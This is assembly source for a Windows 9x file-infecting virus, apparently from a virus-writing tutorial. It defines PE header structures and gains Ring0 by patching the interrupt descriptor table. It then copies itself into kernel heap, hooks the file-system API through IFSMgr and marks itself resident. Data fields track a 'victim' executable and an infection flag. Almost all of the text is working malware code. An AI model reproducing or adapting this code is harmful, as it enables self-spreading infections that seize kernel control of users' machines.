;=====( Macros )=============================================================

vxdcall macro vxd_id, service_id	     ; These are macros used to
      int 20h				     ; call a VxD service or...
      dw service_id			     ;
      dw vxd_id 			     ;
endm					     ;

;=====( Equates )============================================================

IFSMgr			 = 0040h	     ; VXD service
GetHeap 		 = 000dh	     ;
InstallFileSystemAPIhook = 0067h	     ;
Ring0_FileIO		 = 0032h	     ;
UniToBCSPath		 = 0041h	     ;
IFSFN_OPEN		 = 36		     ; open file
R0_OPENCREATFILE	 = 0D500h	     ; Open/Create a file
R0_READFILE		 = 0D600h	     ; Read a file, no context
R0_WRITEFILE		 = 0D601h	     ; Write to a file, no context
R0_CLOSEFILE		 = 0D700h	     ; Close a file
exception_int		 = 3		     ;
exe_ext 		 = 'EXE.'	     ;
virussize		 = end-start	     ;

start:					     ;
       call get_delta			     ;
					     ;
get_delta:				     ;
       pop ebp				     ;
       sub ebp, offset get_delta	     ;
       jmp realstart			     ; jump over data

IDT_Address	 dq 0			     ; IDT address
exception	 dd 0			     ; exception place
old_offset	 dd 0			     ; real old offset
flag		 db 0			     ; infection flag
newaddress	 dd 0			     ; new virus place
filename	 db 260 dup (0) 	     ; victim's name
handle		 dd 0			     ; victim's handle
crt_move	 dd 0			     ; current movement in file
sec_ptr 	 dd 0			     ; pointer to section
Old_EIP 	 dd 0			     ; Old Entry point
S_Align 	 dd 0			     ; section alignment
F_Align 	 dd 0			     ; file alignment
SOI		 dd 0			     ; size of image
peheader	 dd 0			     ; pe header address
virusplace	 dd 0			     ; virus place in victim
imagebase	 dd 0			     ; imagebase of victim
					     ;
SEH_oldpointer	 dd ?			     ; SEH saved pointer
SEH_nextpointer  dd ?			     ; SEH structure... old pointer
SEH_errorhandler dd ?			     ;			new pointer

;=====( File header structures )=============================================

IMAGE_DOS_HEADER STRUC		  ; DOS .EXE header
    MZ_magic	  DW ?		  ; Magic number
    MZ_cblp	  DW ?		  ; Bytes on last page of file
    MZ_cp	  DW ?		  ; Pages in file
    MZ_crlc	  DW ?		  ; Relocations
    MZ_cparhdr	  DW ?		  ; Size of header in paragraphs
    MZ_minalloc   DW ?		  ; Minimum extra paragraphs needed
    MZ_maxalloc   DW ?		  ; Maximum extra paragraphs needed
    MZ_ss	  DW ?		  ; Initial (relative) SS value
    MZ_sp	  DW ?		  ; Initial SP value
    MZ_csum	  DW ?		  ; Checksum
    MZ_ip	  DW ?		  ; Initial IP value
    MZ_cs	  DW ?		  ; Initial (relative) CS value
    MZ_lfarlc	  DW ?		  ; File address of relocation table
    MZ_ovno	  DW ?		  ; Overlay number
    MZ_res	  DW 4 DUP(?)	  ; Reserved words
    MZ_oemid	  DW ?		  ; OEM identifier (for MZ_oeminfo)
    MZ_oeminfo	  DW ?		  ; OEM information; MZ_oemid specific
    MZ_res2	  DW 10 DUP(?)	  ; Reserved words
    MZ_lfanew	  DD ?		  ; File address of new exe header
IMAGE_DOS_HEADER ENDS		  ;
IMAGE_DOS_HEADER_SIZE = SIZE IMAGE_DOS_HEADER
				  ;
IMAGE_FILE_HEADER STRUC 	  ; Portable Exe File
    PE_Magic		     DD ? ;
    Machine		     DW ? ; Machine type
    NumberOfSections	     DW ? ; Number of sections
    TimeDateStamp	     DD ? ; Date and Time
    PointerToSymbolTable     DD ? ; Pointer to Symbols
    NumberOfSymbols	     DD ? ; Number of Symbols
    SizeOfOptionalHeader     DW ? ; Size of Optional Header
    Characteristics	     DW ? ; File characteristics
IMAGE_FILE_HEADER ENDS		  ;
IMAGE_FILE_HEADER_SIZE = SIZE IMAGE_FILE_HEADER

IMAGE_DATA_DIRECTORY STRUC			   ; Image data directory
    DD_VirtualAddress DD ?			   ; Virtual address
    DD_Size	      DD ?			   ; Virtual size
IMAGE_DATA_DIRECTORY ENDS			   ;
						   ;
IMAGE_DIRECTORY_ENTRIES STRUC			   ; All directories
    DE_Export		IMAGE_DATA_DIRECTORY	?  ;
    DE_Import		IMAGE_DATA_DIRECTORY	?  ;
    DE_Resource 	IMAGE_DATA_DIRECTORY	?  ;
    DE_Exception	IMAGE_DATA_DIRECTORY	?  ;
    DE_Security 	IMAGE_DATA_DIRECTORY	?  ;
    DE_BaseReloc	IMAGE_DATA_DIRECTORY	?  ;
    DE_Debug		IMAGE_DATA_DIRECTORY	?  ;
    DE_Copyright	IMAGE_DATA_DIRECTORY	?  ;
    DE_GlobalPtr	IMAGE_DATA_DIRECTORY	?  ;
    DE_TLS		IMAGE_DATA_DIRECTORY	?  ;
    DE_LoadConfig	IMAGE_DATA_DIRECTORY	?  ;
    DE_BoundImport	IMAGE_DATA_DIRECTORY	?  ;
    DE_IAT		IMAGE_DATA_DIRECTORY	?  ;
IMAGE_DIRECTORY_ENTRIES ENDS			   ;
IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16		   ;
						   ;
IMAGE_OPTIONAL_HEADER STRUC			   ; Optional Header
    OH_Magic			    DW ?	   ; Magic word
    OH_MajorLinkerVersion	    DB ?	   ; Major Linker version
    OH_MinorLinkerVersion	    DB ?	   ; Minor Linker version
    OH_SizeOfCode		    DD ?	   ; Size of code section
    OH_SizeOfInitializedData	    DD ?	   ; Initialized Data
    OH_SizeOfUninitializedData	    DD ?	   ; Uninitialized Data
    OH_AddressOfEntryPoint	    DD BYTE PTR ?  ; Initial EIP
    OH_BaseOfCode		    DD BYTE PTR ?  ; Code Virtual Address
    OH_BaseOfData		    DD BYTE PTR ?  ; Data Virtual Address
    OH_ImageBase		    DD BYTE PTR ?  ; Base of image
    OH_SectionAlignment 	    DD ?	   ; Section Alignment
    OH_FileAlignment		    DD ?	   ; File Alignment
    OH_MajorOperatingSystemVersion  DW ?	   ; Major OS
    OH_MinorOperatingSystemVersion  DW ?	   ; Minor OS
    OH_MajorImageVersion	    DW ?	   ; Major Image version
    OH_MinorImageVersion	    DW ?	   ; Minor Image version
    OH_MajorSubsystemVersion	    DW ?	   ; Major Subsys version
    OH_MinorSubsystemVersion	    DW ?	   ; Minor Subsys version
    OH_Win32VersionValue	    DD ?	   ; win32 version
    OH_SizeOfImage		    DD ?	   ; Size of image
    OH_SizeOfHeaders		    DD ?	   ; Size of Header
    OH_CheckSum 		    DD ?	   ; unused
    OH_Subsystem		    DW ?	   ; Subsystem
    OH_DllCharacteristics	    DW ?	   ; DLL characteristic
    OH_SizeOfStackReserve	    DD ?	   ; Stack reserve
    OH_SizeOfStackCommit	    DD ?	   ; Stack commit
    OH_SizeOfHeapReserve	    DD ?	   ; Heap reserve
    OH_SizeOfHeapCommit 	    DD ?	   ; Heap commit
    OH_LoaderFlags		    DD ?	   ; Loader flags
    OH_NumberOfRvaAndSizes	    DD ?	   ; Number of directories
				    UNION	   ; directory entries
    OH_DataDirectory		    IMAGE_DATA_DIRECTORY\
				    IMAGE_NUMBEROF_DIRECTORY_ENTRIES DUP (?)
    OH_DirectoryEntries 	    IMAGE_DIRECTORY_ENTRIES ?
				    ENDS	   ;
    ENDS					   ;
IMAGE_OPTIONAL_HEADER_SIZE = SIZE IMAGE_OPTIONAL_HEADER
						   ;
IMAGE_SECTION_HEADER STRUC			   ; Section hdr.
    SH_Name		    DB 8 DUP(?) 	   ; name
			    UNION		   ;
    SH_PhysicalAddress	    DD BYTE PTR ?	   ; Physical address
    SH_VirtualSize	    DD ?		   ; Virtual size
			    ENDS		   ;
    SH_VirtualAddress	    DD BYTE PTR ?	   ; Virtual address
    SH_SizeOfRawData	    DD ?		   ; Raw data size
    SH_PointerToRawData     DD BYTE PTR ?	   ; pointer to raw data
    SH_PointerToRelocations DD BYTE PTR ?	   ; ...
    SH_PointerToLinenumbers DD BYTE PTR ?	   ; ...... not really used
    SH_NumberOfRelocations  DW ?		   ; ....
    SH_NumberOfLinenumbers  DW ?		   ; ..
    SH_Characteristics	    DD ?		   ; flags
IMAGE_SECTION_HEADER ENDS			   ;
IMAGE_SECTION_HEADER_SIZE = SIZE IMAGE_SECTION_HEADER
						   ;
my_mz_header IMAGE_DOS_HEADER	   ?		   ; our real data comes
my_pe_header IMAGE_FILE_HEADER	   ?		   ; here...
my_oh_header IMAGE_OPTIONAL_HEADER ?		   ;
my_section   IMAGE_SECTION_HEADER  ?		   ;

realstart:					 ;
       mov eax, dword ptr fs:[00H]		 ; get the old seh pointer
       mov dword ptr [ebp+SEH_nextpointer], eax  ; set in structure
       mov dword ptr [ebp+SEH_oldpointer], eax	 ; and save for restore
       lea eax, [ebp+return_to_host]		 ; make it point here...
       mov dword ptr [ebp+SEH_errorhandler], eax ;
       lea eax, [ebp+SEH_nextpointer]		 ;
       mov dword ptr fs:[00H], eax		 ; and point the structure

       sidt [ebp+IDT_Address]		     ; Get interrupt address
       mov esi, dword ptr [ebp+IDT_Address+2]; (first 2 are the length)
       add esi, exception_int*8 	     ; get the offset for Int
       mov dword ptr [ebp+exception], esi    ; save exception place
       mov bx, word ptr [esi+6] 	     ; get low word
       shl ebx, 10H			     ; shift left
       mov bx, word ptr [esi]		     ; get high word
       mov dword ptr [ebp+old_offset], ebx   ; save exception offset
       lea eax, [ebp+offset Ring0]	     ; eax=new Int handler
       mov word ptr [esi], ax		     ; store high word
       shr eax, 10H			     ; shift right
       mov word ptr [esi+6], ax 	     ; and store low word

       mov eax, 0c000e990h		     ; check residency mark...
       cmp dword ptr [eax], 'MWAR'	     ; use your own here...
       jne go_on_to_ring0		     ;
       jmp already_installed		     ;

go_on_to_ring0: 			     ;
       int exception_int		     ; Generate exception -> Ring0 !

already_installed:			     ;
       mov esi, dword ptr [ebp+exception]    ; restore IDT address
       mov ebx, dword ptr [ebp+old_offset]   ; restore exception offset
       mov word ptr [esi], bx		     ; restore exception
       shr ebx, 10H			     ; handler
       mov word ptr [esi+6], bx 	     ;
					     ;
return_to_host: 			     ;
       mov eax, dword ptr [ebp+SEH_oldpointer]; restore the old SEH pointer
       mov dword ptr fs:[00H], eax	     ;
					     ;
exit:					     ;
       cmp ebp, 0			     ;
       je generation_1			     ;
       mov eax, [ebp+Old_EIP]		     ;
       add eax, [ebp+imagebase] 	     ;
       jmp eax				     ;
					     ;
generation_1:				     ;
       Push 0				     ;
       Call ExitProcess 		     ; and exit

Ring0 proc				     ; Here we are at Ring0
       pushad				     ; save registers
       mov eax, end-start+100		     ; memory needed
       push eax 			     ;
					     ;
fix_1_value equ GetHeap+256*256*IFSMgr	     ; fix dword for GetHeap
fix_1:					     ;
       vxdcall IFSMgr, GetHeap		     ; get it!
       pop ecx				     ; in ecx...
       or eax, eax			     ; did we make it?
       jz no_free_mem			     ;

       xchg eax, edi			     ; EDI = new free memory area
       lea esi, dword ptr [ebp+start]	     ; ESI = start of virus
       push edi 			     ;
       mov ecx, end-start		     ;
       rep movsb			     ; copy virus...
       pop edi				     ;
       mov dword ptr [ebp+newaddress], edi   ;
       mov dword ptr [edi+delta1-start], edi ;

       lea eax, [edi+API_hook-start]	     ; FSAPI hook
       push eax 			     ;
					     ;
fix_2_value equ InstallFileSystemAPIhook+256*256*IFSMgr;
fix_2:					     ;
       vxdcall IFSMgr, InstallFileSystemAPIhook; install new handler
       pop ebx				     ; just to restore stack
       mov [edi+nexthook-start], eax	     ; save the old hook handler
       jmp install_success		     ;

no_free_mem:				     ;
       jmp exit_to_ring3		     ;
					     ;
install_success:			     ;
       mov eax, 0c000e990h		     ; mark as resident
       mov dword ptr [eax], 'MWAR'	     ;
       mov byte ptr [edi+flag-start], 0      ; reset flag
					     ;
exit_to_ring3:				     ;
       popad				     ; restore regs
       iretd				     ; Get out of R0
Ring0 endp				     ;
